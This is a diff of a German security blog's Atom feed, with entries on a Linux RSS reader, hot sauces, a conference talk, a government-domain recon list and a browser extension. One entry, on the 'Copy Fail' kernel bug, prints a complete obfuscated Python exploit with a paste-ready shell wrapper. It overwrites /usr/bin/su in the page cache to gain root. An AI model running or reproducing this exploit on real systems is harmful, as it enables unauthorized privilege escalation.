@@ -3,12 +3,40 @@
     <title>1337core Blog</title>
     <link href="https://www.1337core.de/blog/feed.xml" rel="self" />
     <link href="https://www.1337core.de/blog" />
-    <updated>2026-05-07T16:32:46+02:00</updated>
+    <updated>2026-06-14T13:33:48+02:00</updated>
     <author>
         <name>Leetcore</name>
     </author>
     <id>https://www.1337core.de/blog</id>
 
+    <entry>
+        <title>Newsflash App für Linux</title>
+        <author>
+            <name>Leetcore</name>
+        </author>
+        <link href="https://www.1337core.de/blog/newsflash-app-fuer-linux.html"/>
+        <id>https://www.1337core.de/blog/newsflash-app-fuer-linux.html</id>
+        <media:content url="https://www.1337core.de/blog/media/posts/19/Bildschirmfoto-vom-2026-06-14-13-15-50-2.png" medium="image" />
+            <category term="RSS"/>
+            <category term="Linux"/>
+            <category term="App"/>
+
+        <updated>2026-05-30T22:50:37+02:00</updated>
+            <summary type="html">
+                <![CDATA[
+                        <img src="https://www.1337core.de/blog/media/posts/19/Bildschirmfoto-vom-2026-06-14-13-15-50-2.png" alt="NewsFlash Screenshot" />
+                    Ich mag die normalen Feed-Reader. Die einfach die Liste deiner Newsfeeds haben und die lokal abrufen. Ich brauche da keinen Server und Synchronisierung über mehrere Systeme mit der gleichen App. Einfach einen Standard-Reader mit OPML-Import/Export. Für Gnome-Nutzer macht das Newsflash. Für MacOS gibt es Reeder.
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                    <p><img src="https://www.1337core.de/blog/media/posts/19/Bildschirmfoto-vom-2026-06-14-13-15-50-2.png" class="type:primaryImage" alt="NewsFlash Screenshot" /></p>
+                <p>Ich mag die normalen Feed-Reader. Die einfach die Liste deiner Newsfeeds haben und die lokal abrufen. Ich brauche da keinen Server und Synchronisierung über mehrere Systeme mit der gleichen App. Einfach einen Standard-Reader mit OPML-Import/Export.</p>
+<p><a href="https://apps.gnome.org/de/NewsFlash/">Für Gnome-Nutzer macht das Newsflash.</a></p>
+<p><a href="https://apps.apple.com/us/app/reeder/id6475002485">Für MacOS gibt es Reeder.</a></p>
+            ]]>
+        </content>
+    </entry>
     <entry>
         <title>Copy Fail Linux Kernel Exploit</title>
         <author>
@@ -16,6 +44,7 @@
         </author>
         <link href="https://www.1337core.de/blog/copy-fail-linux-kernel-exploit.html"/>
         <id>https://www.1337core.de/blog/copy-fail-linux-kernel-exploit.html</id>
+        <media:content url="https://www.1337core.de/blog/media/posts/18/Screenshot-2026-06-14-at-13-19-54-Copy-Fail-CVE-2026-31431.png" medium="image" />
             <category term="Root"/>
             <category term="Linux"/>
             <category term="Exploit"/>
@@ -23,11 +52,13 @@
         <updated>2026-05-07T16:19:01+02:00</updated>
             <summary type="html">
                 <![CDATA[
+                        <img src="https://www.1337core.de/blog/media/posts/18/Screenshot-2026-06-14-at-13-19-54-Copy-Fail-CVE-2026-31431.png" alt="PoC Screenshot" />
                     Durch einen Page Cache Fehler ist es möglich 4 Bytes einer Datei im Page Cache zu ändern und sie danach auszuführen. Damit lässt sich bei su das entsprechende Bit setzen, sodass wir kein Passwort mehr eingeben müssen und direkt root sind. Falls der PoC von copy.fail nicht funktioniert, habe ich hier etwas für eure Zwischenablage. pycode=$(cat &lt;&lt;PY #!/usr/bin/env python3 import os as g,zlib,socket as s def d(x):return bytes.fromhex(x) def c(f,t,c): a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o) try:u.recv(8+t) except:0 f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3")) while i&lt;len(e):c(f,i,e[i:i+4]);i+=4 g.system("su") PY ) echo "$pycode" | python3 &amp;&amp; su Die nächste Capture the Flag Challenges werden deutlich einfacher. 😉
                 ]]>
             </summary>
         <content type="html">
             <![CDATA[
+                    <p><img src="https://www.1337core.de/blog/media/posts/18/Screenshot-2026-06-14-at-13-19-54-Copy-Fail-CVE-2026-31431.png" class="type:primaryImage" alt="PoC Screenshot" /></p>
                 <p>Durch einen Page Cache Fehler ist es möglich 4 Bytes einer Datei im Page Cache zu ändern und sie danach auszuführen. Damit lässt sich bei su das entsprechende Bit setzen, sodass wir kein Passwort mehr eingeben müssen und direkt root sind.</p>
 <p>Falls der PoC von <a href="https://copy.fail/">copy.fail</a> nicht funktioniert, habe ich hier etwas für eure Zwischenablage.</p>
 <pre class="language-bash"><code>pycode=$(cat &lt;&lt;PY
@@ -55,20 +86,22 @@ echo "$pycode" | python3 &amp;&amp; su</code></pre>
         </author>
         <link href="https://www.1337core.de/blog/hot-ones-saucen-getestet.html"/>
         <id>https://www.1337core.de/blog/hot-ones-saucen-getestet.html</id>
+        <media:content url="https://www.1337core.de/blog/media/posts/17/Screenshot-2026-02-19-at-18-00-25-Die-Wahrheit-ueber-Hot-Ones-Saucen-YouTube-md.png" medium="image" />
             <category term="YouTube"/>
 
         <updated>2026-02-19T18:19:17+01:00</updated>
             <summary type="html">
                 <![CDATA[
+                        <img src="https://www.1337core.de/blog/media/posts/17/Screenshot-2026-02-19-at-18-00-25-Die-Wahrheit-ueber-Hot-Ones-Saucen-YouTube-md.png" alt="Hot Onces Skala Scoville" />
                     Wer die Serie "Hot Ones" von YouTube kennt, dem wird der Begriff "Da Bomb" etwas sagen. Bei dieser Show werden berühmte Schauspieler/innen oder Sänger/innen interviewt, während sie scharfe Chicken Wings essen. Es gibt eine Scoville Skala, die den Schärfegrad messen soll. Allerdings bezieht sich die Zahl selbst nur auf die Schärfezutat und nicht auf die Soße selbst. In einer Recherche wurden nun die Soßen (aus Staffel 25) als Gesamtprodukt getestet und hier ist "Da Bomb" deutlich schärfer als die letzten beiden Soßen. Das deckt sich dann auch mit den Reaktionen in den Videos. ;)
                 ]]>
             </summary>
         <content type="html">
             <![CDATA[
+                    <p><img src="https://www.1337core.de/blog/media/posts/17/Screenshot-2026-02-19-at-18-00-25-Die-Wahrheit-ueber-Hot-Ones-Saucen-YouTube-md.png" class="type:primaryImage" alt="Hot Onces Skala Scoville" /></p>
                 <p>Wer die Serie "Hot Ones" von YouTube kennt, dem wird der Begriff "Da Bomb" etwas sagen. Bei dieser Show werden berühmte Schauspieler/innen oder Sänger/innen interviewt, während sie scharfe Chicken Wings essen.</p>
 <p>Es gibt eine Scoville Skala, die den Schärfegrad messen soll. Allerdings bezieht sich die Zahl selbst nur auf die Schärfezutat und nicht auf die Soße selbst. In einer Recherche wurden nun die Soßen (aus Staffel 25) als Gesamtprodukt getestet und hier ist "Da Bomb" deutlich schärfer als die letzten beiden Soßen.</p>
 <p>Das deckt sich dann auch mit den Reaktionen in den Videos. ;)</p>
-<figure class="post__image post__image--center"><img loading="lazy"  src="https://www.1337core.de/blog/media/posts/17/Screenshot-2026-02-19-at-18-00-25-Die-Wahrheit-ueber-Hot-Ones-Saucen-YouTube.png" alt="" width="1310" height="737" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://www.1337core.de/blog/media/posts/17/responsive/Screenshot-2026-02-19-at-18-00-25-Die-Wahrheit-ueber-Hot-Ones-Saucen-YouTube-xs.png 300w ,https://www.1337core.de/blog/media/posts/17/responsive/Screenshot-2026-02-19-at-18-00-25-Die-Wahrheit-ueber-Hot-Ones-Saucen-YouTube-sm.png 480w ,https://www.1337core.de/blog/media/posts/17/responsive/Screenshot-2026-02-19-at-18-00-25-Die-Wahrheit-ueber-Hot-Ones-Saucen-YouTube-md.png 768w ,https://www.1337core.de/blog/media/posts/17/responsive/Screenshot-2026-02-19-at-18-00-25-Die-Wahrheit-ueber-Hot-Ones-Saucen-YouTube-lg.png 1024w"></figure>
             ]]>
         </content>
     </entry>
@@ -79,6 +112,7 @@ echo "$pycode" | python3 &amp;&amp; su</code></pre>
         </author>
         <link href="https://www.1337core.de/blog/massenhacks-cyberangriffe-in-serie.html"/>
         <id>https://www.1337core.de/blog/massenhacks-cyberangriffe-in-serie.html</id>
+        <media:content url="https://www.1337core.de/blog/media/posts/16/Massenhacks.jpeg" medium="image" />
             <category term="Speaker"/>
             <category term="Präsentation"/>
             <category term="Cybersecurity"/>
@@ -86,11 +120,13 @@ echo "$pycode" | python3 &amp;&amp; su</code></pre>
         <updated>2026-02-16T09:22:58+01:00</updated>
             <summary type="html">
                 <![CDATA[
+                        <img src="https://www.1337core.de/blog/media/posts/16/Massenhacks.jpeg" alt="" />
                     Ich war mit einem Partner-Unternehmen auf der IT.con in Saarbrücken. Die IT-Messe im Saarland zum Thema IT und Cybersecurity. Da ich gefragt wurde, ob ich gerne einen Vortrag halten möchte, habe ich relativ schnell auf das Thema Massenhacks festgelegt. Nach einiger Recherche welches Beispiel aktuell aus der Praxis passen würde, entwickelte sich "Massenhacks: Cyberangriffe in Serie" mit aktuellen Beispielen von Sicherheitslücken in Citrix NetScaler. In der Session ging es um die wachsende Professionalisierung von Cyberangriffen und darum, wie aus vereinzelten Attacken längst industrielle Prozesse geworden sind. Angreifer automatisieren ihre Methoden, scannen systematisch ganze IP-Bereiche und nutzen öffentliche Exploits um Schwachstellen&hellip;
                 ]]>
             </summary>
         <content type="html">
             <![CDATA[
+                    <p><img src="https://www.1337core.de/blog/media/posts/16/Massenhacks.jpeg" class="type:primaryImage" alt="" /></p>
                 <p>Ich war mit einem Partner-Unternehmen auf der IT.con in Saarbrücken. Die IT-Messe im Saarland zum Thema IT und Cybersecurity. Da ich gefragt wurde, ob ich gerne einen Vortrag halten möchte, habe ich relativ schnell auf das Thema Massenhacks festgelegt.</p>
 <p>Nach einiger Recherche welches Beispiel aktuell aus der Praxis passen würde, entwickelte sich "Massenhacks: Cyberangriffe in Serie" mit aktuellen Beispielen von Sicherheitslücken in Citrix NetScaler.</p>
 <p>In der Session ging es um die wachsende Professionalisierung von Cyberangriffen und darum, wie aus vereinzelten Attacken längst industrielle Prozesse geworden sind. Angreifer automatisieren ihre Methoden, scannen systematisch ganze IP-Bereiche und nutzen öffentliche Exploits um Schwachstellen gezielt in der Breite auszunutzen.</p>
@@ -118,22 +154,35 @@ echo "$pycode" | python3 &amp;&amp; su</code></pre>
         </author>
         <link href="https://www.1337core.de/blog/recon-deutschland.html"/>
         <id>https://www.1337core.de/blog/recon-deutschland.html</id>
+        <media:content url="https://www.1337core.de/blog/media/posts/14/Screenshot-2026-06-14-at-13-31-29-Land-Deutschland-Wikipedia.png" medium="image" />
             <category term="Security"/>
             <category term="Analyse"/>
 
         <updated>2026-02-12T16:29:17+01:00</updated>
             <summary type="html">
                 <![CDATA[
-                    "Recon Deutschland" ist ein Projekt, bei dem ich systematisch alle Domains der öffentlichen Verwaltung aus Deutschland zusammen suche. Damit lässt sich die IT-Angriffsfläche weitgehend analysieren. Die ursprünglichen Listen der Websites stammen von Wikidata. Dort lassen sich verknüpfte Wikipedia Seiten durchsuchen. Durch den Query Builder kann direkt nach Bundesländer, Landkreise, Städte, Gemeinden und Ortschaften gesucht werden. Aus diesen Ergebnissen lasse ich die Webseite extrahieren. Zusätzlich gibt es eine Liste von Universitäten in Deutschland. Die Domains von öffentlichen Verwaltungsorganen in Deutschland. GitHub: https://github.com/Leetcore/recon-deutschland
+                        <img src="https://www.1337core.de/blog/media/posts/14/Screenshot-2026-06-14-at-13-31-29-Land-Deutschland-Wikipedia.png" alt="" />
+                    "Recon Deutschland" ist ein Projekt, bei dem ich systematisch alle Domains der öffentlichen Verwaltung aus Deutschland zusammen suche. Damit lässt sich die IT-Angriffsfläche weitgehend analysieren. Die ursprünglichen Listen der Websites stammen von Wikidata. Dort lassen sich verknüpfte Wikipedia Seiten durchsuchen. Durch den Query Builder kann direkt nach Bundesländer, Landkreise, Städte, Gemeinden und Ortschaften gesucht werden. Aus diesen Ergebnissen lasse ich die Webseite extrahieren. Zusätzlich gibt es eine Liste von Universitäten in Deutschland. /input/bundeslaender.txt Die Domains aller Bundesländer. /input/verwaltung.txt Die Domains von öffentlichen Verwaltungsorganen in Deutschland. /input/orte.txt Alle Domains aus der Wikidata Liste der Orte. /input/unis.txt Eine Liste mit allen Hochschulen&hellip;
                 ]]>
             </summary>
         <content type="html">
             <![CDATA[
+                    <p><img src="https://www.1337core.de/blog/media/posts/14/Screenshot-2026-06-14-at-13-31-29-Land-Deutschland-Wikipedia.png" class="type:primaryImage" alt="" /></p>
                 <p>"Recon Deutschland" ist ein Projekt, bei dem ich systematisch alle Domains der öffentlichen Verwaltung aus Deutschland zusammen suche. Damit lässt sich die IT-Angriffsfläche weitgehend analysieren.</p>
 <p dir="auto">Die ursprünglichen Listen der Websites stammen von Wikidata. Dort lassen sich verknüpfte Wikipedia Seiten durchsuchen. Durch den <a href="https://query.wikidata.org/querybuilder/?uselang=de" rel="nofollow">Query Builder</a> kann direkt nach Bundesländer, Landkreise, Städte, Gemeinden und Ortschaften gesucht werden. Aus diesen Ergebnissen lasse ich die Webseite extrahieren. Zusätzlich gibt es eine Liste von Universitäten in Deutschland.</p>
 <div class="markdown-heading" dir="auto">
-<h3 class="heading-element" dir="auto" tabindex="-1">/input/verwaltung.txt</h3>
-<p class="heading-element" dir="auto" tabindex="-1"><span style="color: #a5a7b7; font-family: sans-serif; font-size: inherit; font-weight: 400;">Die Domains von öffentlichen Verwaltungsorganen in Deutschland.</span></p>
+<div class="markdown-heading" dir="auto">
+<p class="heading-element" dir="auto" tabindex="-1"><strong>/input/bundeslaender.txt<br></strong><span style="color: #a5a7b7; font-family: sans-serif; font-size: inherit; font-weight: 400;">Die Domains aller Bundesländer.</span></p>
+</div>
+<div class="markdown-heading" dir="auto">
+<p dir="auto" tabindex="-1"><strong>/input/verwaltung.txt</strong><br><span style="font-size: inherit;">Die Domains von öffentlichen Verwaltungsorganen in Deutschland.</span></p>
+</div>
+<div class="markdown-heading" dir="auto">
+<p dir="auto" tabindex="-1"><strong>/input/orte.txt</strong><br><span style="font-size: inherit;">Alle Domains aus der Wikidata Liste der Orte.</span></p>
+</div>
+<div class="markdown-heading" dir="auto">
+<p class="heading-element" dir="auto" tabindex="-1"><strong>/input/unis.txt</strong><br><span style="color: #a5a7b7; font-family: sans-serif; font-size: inherit; font-weight: 400;">Eine Liste mit allen Hochschulen und Universitäten in Deutschland.</span></p>
+</div>
 <p dir="auto" tabindex="-1">GitHub: <a href="https://github.com/Leetcore/recon-deutschland">https://github.com/Leetcore/recon-deutschland</a></p>
 </div>
             ]]>
@@ -280,6 +329,7 @@ echo "$pycode" | python3 &amp;&amp; su</code></pre>
         </author>
         <link href="https://www.1337core.de/blog/ninja-hacker-cat-fuer-firefox.html"/>
         <id>https://www.1337core.de/blog/ninja-hacker-cat-fuer-firefox.html</id>
+        <media:content url="https://www.1337core.de/blog/media/posts/2/275081.png" medium="image" />
             <category term="Open Source"/>
             <category term="Firefox"/>
             <category term="Erweiterung"/>
@@ -287,11 +337,13 @@ echo "$pycode" | python3 &amp;&amp; su</code></pre>
         <updated>2025-09-14T20:46:53+02:00</updated>
             <summary type="html">
                 <![CDATA[
+                        <img src="https://www.1337core.de/blog/media/posts/2/275081.png" alt="" />
                     Das ist ein Archivpost vom 15.10.2022. Das Projekt wird von mir nicht weiterentwickelt. Projekte, Projekte, Projekte. Diese Idee war erstaunlich gut: Wie kann man Webseiten auf Sicherheitslücken testen und das für viele Menschen einfacher machen? Mit einer Browser-Erweiterung: Eine Browser-Erweiterung, die automatisch verschiedene Tests durchführt. Also den Twitch-Stream angeworfen und den hübschesten Texteditor aller Zeiten gestartet. Ja, ich habe jetzt auch eine Katze in meinem Code-Editor. Weil... KATZE! Einfache Sicherheitslücken, lassen sich relativ gut automatisch erkennen. Das bringe ich meiner Hacker-Katze nun bei. Wenn sich die Version der Web Anwendung herausfinden lässt, kann ich auch anhand der Version vor Lücken&hellip;
                 ]]>
             </summary>
         <content type="html">
             <![CDATA[
+                    <p><img src="https://www.1337core.de/blog/media/posts/2/275081.png" class="type:primaryImage" alt="" /></p>
                 
   <p>
     Das ist ein Archivpost vom 15.10.2022. Das Projekt wird von mir nicht weiterentwickelt.
